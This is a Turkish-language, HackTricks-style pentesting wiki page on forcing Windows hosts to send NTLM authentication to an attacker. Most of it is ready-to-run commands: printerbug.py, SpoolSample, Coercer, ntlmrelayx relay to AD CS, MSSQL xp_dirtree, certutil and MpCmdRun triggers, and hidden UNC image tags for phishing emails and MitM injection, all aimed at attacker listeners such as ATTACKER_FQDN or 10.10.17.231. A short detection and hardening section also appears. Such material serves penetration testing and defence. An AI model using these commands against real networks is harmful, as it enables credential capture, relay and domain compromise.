# NTLM Ayrıcalıklı Kimlik Doğrulamasını Zorlama

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers), 3. taraf bağımlılıklarını önlemek için MIDL compiler kullanılarak C# ile kodlanmış bir **uzaktan kimlik doğrulama tetikleyicileri koleksiyonudur**.

## Spooler Service Abuse

_**Print Spooler**_ hizmeti **etkinse,** bilinen bazı AD kimlik bilgilerini kullanarak Domain Controller’ın print server’ından yeni yazdırma işleri hakkında **güncelleme isteyebilir** ve bildirimi **herhangi bir sisteme göndermesini** söyleyebilirsiniz.\
Yazıcı bildirimi rastgele bir sisteme gönderdiğinde, o **sisteme karşı kimlik doğrulaması** yapması gerektiğini unutmayın. Bu nedenle saldırgan, _**Print Spooler**_ hizmetinin rastgele bir sisteme karşı kimlik doğrulaması yapmasını sağlayabilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını kullanır**.

Arka planda, klasik **PrinterBug** primitive’i **`\\PIPE\\spoolss`** üzerinden **`RpcRemoteFindFirstPrinterChangeNotificationEx`**’i kötüye kullanır. Saldırgan önce bir yazıcı/sunucu handle’ı açar ve ardından `pszLocalMachine` içine sahte bir client name girer; böylece hedef spooler, **saldırganın kontrolündeki host’a** geri bir bildirim kanalı oluşturur. Bu nedenle sonuç, doğrudan kod yürütme değil, **giden kimlik doğrulamasının zorlanmasıdır**.<sup>[[2]](#references)</sup>\
Spooler’ın kendisinde **RCE/LPE** arıyorsanız [PrintNightmare](printnightmare.md) sayfasına bakın. Bu sayfa **zorlama ve relay** konusuna odaklanır.

### Etki alanındaki Windows sunucularını bulma

Windows host’larını listelemek için PowerShell kullanın. Sunucular genellikle en yüksek öncelikli hedeflerdir; bu nedenle önce onlara odaklanın:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Dinleyen Spooler hizmetlerini bulma

@mysmartlogin'in (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracının biraz değiştirilmiş bir sürümünü kullanarak Spooler Service'in dinleyip dinlemediğini kontrol edin:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Linux'ta `rpcdump.py` aracını da kullanabilir ve **MS-RPRN** protokolünü arayabilirsiniz:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Ya da Linux'tan ana makineleri hızlıca test edin: **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Spooler endpoint'inin var olup olmadığını kontrol etmekle yetinmek yerine **coercion yüzeylerini enumerate etmek** istiyorsanız, **Coercer scan mode**'u kullanın:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Bu kullanışlıdır; çünkü EPM'de endpoint'i görmek yalnızca print RPC interface'inin kayıtlı olduğunu gösterir. Bu, mevcut yetkilerinizle her coercion yöntemine erişilebileceğini veya host'un kullanılabilir bir authentication akışı oluşturacağını **garanti etmez**.

### Service'den rastgele bir host'a authentication yapmasını isteyin

[SpoolSample'ı orijinal repository'den](https://github.com/leechristensen/SpoolSample) derleyebilirsiniz.

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

veya Linux kullanıyorsanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ya da [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın.

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

**Coercer** ile spooler arayüzlerini doğrudan hedefleyebilir ve hangi RPC yönteminin açığa çıktığını tahmin etmek zorunda kalmazsınız:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Modern RPC-over-TCP callback'leri

Başarılı bir `RpcRemoteFindFirstPrinterChangeNotificationEx` çağrısının mutlaka TCP/445 üzerinden trafik oluşturacağını varsaymayın. **Windows 11 22H2 ve sonraki sürümler, yazdırma iletişimleri için varsayılan olarak RPC over TCP kullanır**; ilke veya `RpcUseNamedPipeProtocol=1` ile yeniden etkinleştirilmediği sürece RPC over named pipes devre dışıdır. Bu nedenle, yalnızca SMB dinleyen eski sistemler tetikleyicinin gönderildiğini bildirebilir ancak callback'i hiçbir zaman almayabilir. Microsoft, normal yazdırma RPC'si için TCP/135 (Endpoint Mapper) ve dinamik RPC portlarını belgeler; kuruluşlar bu aralığı kısıtlayabilir veya sabit bir yazdırma RPC portu seçebilir.<sup>[[10]](#references)</sup>

Güncel **Impacket `ntlmrelayx.py`**, varsayılan olarak TCP/135 üzerinde etkinleştirilen bir RPC relay sunucusu ve küçük bir Endpoint Mapper içerir. Bu destek, özellikle Haziran 2025'te gösterilen PrinterBug-to-AD-CS zinciri için birleştirildi; böylece kurban SMB/WebDAV'a geri dönmese bile kimliği doğrulanmış RPC callback'i relay edilebilir.<sup>[[11]](#references)</sup>

RPC relay/EPM desteği **Impacket 0.13.0 ve sonraki sürümlerde** bulunur. Eksik bir TCP/135 dinleyicisini hata ayıklamadan önce, eski paketlenmiş bir `ntlmrelayx.py` dosyasının çalıştırılmadığını doğrulayın; yardım çıktısında her iki RPC sunucusu anahtarı da görünmelidir.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

`Setting up RPC Server on port 135` ve `RPCD: Received connection` ifadelerini relay çıktısında arayın. RPC çağrısı beklenen bir hatayı döndürüyorsa ancak dinleyiciye hiçbir şey ulaşmıyorsa, kurbanın print RPC transport policy ayarını, outbound filtering'i, DNS çözümlemesini ve TCP/135 portunu başka bir process'in kullanıp kullanmadığını kontrol edin. Ayrıca `ntlmrelayx`'in `--no-rpc-server` ile başlatılmadığından emin olun.

### WebClient ile SMB yerine HTTP'yi zorlama

Hâlâ **RPC over named pipes** kullanan sistemlerde (eski build'ler veya policy ile geri yüklenen davranış), klasik PrinterBug genellikle `\\attacker\share` adresine bir **SMB** authentication'ı sağlar. Bu, **capture**, **HTTP target'lara relay** veya **SMB signing'in olmadığı** yerlere relay için hâlâ kullanışlıdır.\
Ancak **SMB'den SMB'ye** relay işlemi genellikle **SMB signing** tarafından engellenir; bu nedenle operatörler bunun yerine **HTTP/WebDAV** authentication'ını zorlamayı tercih edebilir. Bu, yukarıda açıklanan RPC-over-TCP davranışı için bir fallback değildir.

Hedefte **WebClient** service'i çalışıyorsa, Windows'un **WebDAV over HTTP** kullanmasını sağlayacak biçimde listener belirtilebilir:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Bu, **`ntlmrelayx --adcs`** veya diğer HTTP relay hedefleriyle zincirleme kullanıldığında özellikle yararlıdır; çünkü zorlanan bağlantıda SMB relay yapılabilir olmasına bağlı kalmayı önler. Önemli bir nokta: HTTP/WebDAV varyantının çalışması için kurban sistemde **WebClient çalışıyor olmalıdır**.

### Unconstrained Delegation ile birleştirme

Bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) için yapılandırılmış bir bilgisayarı ele geçirmişse, **yazıcıyı bu bilgisayara kimlik doğrulaması yapmaya zorlayabilir**. Yazıcı bilgisayar hesabının **TGT**'si daha sonra unconstrained-delegation ana bilgisayarının belleğinde önbelleğe alınır; saldırgan bu bileti [Pass the Ticket](pass-the-ticket.md) ile alıp yeniden kullanabilir.

### Tespit ve güçlendirme notları

Yazdırma yapmayan bir DC, PAW veya sunucuda PrinterBug'ı ortadan kaldırmanın en güvenilir yolu Spooler'ı durdurup devre dışı bırakmaktır. Yazdırmanın gerekli olduğu yerlerde, geri çağrı yolunda TCP/445'i engellemenin yeterli olduğunu varsaymak yerine tüm olası relay hedeflerini güçlendirin (SMB server signing, LDAP signing/channel binding ve AD CS gibi HTTP hizmetlerinde EPA).<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

If the host hâlâ **yerel yazdırma** gerektiriyorsa, daha dar kapsamlı bir denetim olarak GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled` kullanılabilir. Bu ayar, hizmeti yerel olarak kullanılabilir durumda bırakırken spooler'ın uzak istemci bağlantılarını (ve yazıcı paylaşımını) kabul etmesini önler; ayarı uyguladıktan sonra spooler'ı yeniden başlatın ve ardından yukarıdaki MS-RPRN erişilebilirlik kontrollerini tekrarlayın.<sup>[[13]](#references)</sup>

Detection, MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` için yapılan kimliği doğrulanmış bir çağrıyı, özellikle yerel olmayan bir callback değeri içeren opnum 62/65'i, spooler host'undan hemen sonra gerçekleşen bir dışa dönük SMB, HTTP veya RPC bağlantısıyla ilişkilendirmelidir. Yalnızca `\PIPE\spoolss` erişimini değil, **interface UUID/opnum ve kaynak/hedef çiftlerini** temel alın; çünkü güncel print stack'leri callback'i RPC-over-TCP üzerinden gerçekleştirebilir.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Kimlik doğrulamaya zorlama

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC path zorlama matrisi (dışa dönük kimlik doğrulamayı tetikleyen interface/opnum'lar)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Notlar: aynı spooler pipe üzerindeki asenkron yazdırma interface'i; belirli bir host'ta erişilebilir yöntemleri listelemek için Coercer kullanın<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (ayrıca \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon üzerinden)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Sıklıkla kötüye kullanılan Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

Not: Bu yöntemler UNC path taşıyabilen parametreler alır (ör. `\\attacker\share`). İşlendiğinde Windows, bu UNC'ye kimlik doğrular (makine/kullanıcı bağlamında); böylece NetNTLM yakalama veya relay mümkün olur.\
Spooler'ın kötüye kullanımı için **MS-RPRN opnum 65**, protokol belirtimi sunucunun `pszLocalMachine` ile belirtilen istemciye geri bir bildirim kanalı oluşturduğunu açıkça belirttiğinden, en yaygın ve en iyi belgelenmiş primitive olmayı sürdürmektedir.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) zorlama
- Interface: \\PIPE\\even üzerinden MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Çağrı imzası: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Etki: hedef, sağlanan yedekleme günlük path'ini açmaya çalışır ve saldırganın kontrolündeki UNC'ye kimlik doğrular.<sup>[[1]](#references)</sup>
- Pratik kullanım: Tier 0 varlıklarını (DC/RODC/Citrix/etc.) NetNTLM göndermeye zorlayın, ardından AD CS uç noktalarına (ESC8/ESC11 senaryoları) veya diğer ayrıcalıklı hizmetlere relay edin.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir açıktan kaynaklanır. Bu özellik, posta kutusu olan herhangi bir domain kullanıcısının Exchange server'ı HTTP üzerinden istemcinin sağladığı herhangi bir host'a kimlik doğrulamaya zorlamasına olanak tanır.

Varsayılan olarak **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle **2019 Cumulative Update öncesinde domain üzerinde WriteDacl ayrıcalıkları**). Bu açıktan yararlanılarak bilgilerin LDAP'ye relay edilmesi ve ardından domain NTDS veritabanının çıkarılması sağlanabilir. LDAP'ye relay mümkün değilse bu açık, domain içindeki diğer host'lara relay yapmak ve kimlik doğrulamak için yine de kullanılabilir. Bu saldırıdan başarıyla yararlanılması, kimliği doğrulanmış herhangi bir domain kullanıcı hesabıyla Domain Admin'e anında erişim sağlar.

## Windows içinde

Zaten Windows makinesinin içindeyseniz, ayrıcalıklı hesapları kullanarak Windows'ı bir sunucuya bağlanmaya zorlayabilirsiniz:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Ya da şu diğer tekniği kullanabilirsiniz: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM authentication'ı zorlamak için certutil.exe lolbin'i (Microsoft imzalı binary) kullanmak mümkündür:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### E-posta yoluyla

Ele geçirmek istediğiniz bir makinede oturum açan kullanıcının **e-posta adresini** biliyorsanız, ona örneğin **1x1 boyutunda bir görsel** içeren bir **e-posta** gönderebilirsiniz.

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Kurban bunu açtığında Windows kimlik doğrulaması yapmaya çalışır.

### MitM

MitM saldırısı gerçekleştirebiliyor ve kurbanın görüntülediği bir sayfaya HTML enjekte edebiliyorsanız, aşağıdaki gibi bir görsel enjekte etmeyi deneyin:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## NTLM kimlik doğrulamasını zorlamanın ve oltalamanın diğer yolları


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1'i kırma

[NTLMv1 challenge'larını yakalayabiliyorsanız, nasıl kıracağınızı buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
_Unutmayın, NTLMv1'i kırmak için Responder challenge değerini "1122334455667788" olarak ayarlamanız gerekir_



## References

- [1] [Unit 42 – Kimlik Doğrulama Zorlaması Gelişmeye Devam Ediyor](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Uzaktan Erişim Protokolü](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11'de yazdırma için RPC bağlantı güncelleştirmeleri](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx için RPC relay sunucusu ve Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 sürümü](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Print Spooler'ın istemci bağlantılarını kabul etmesine izin ver](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
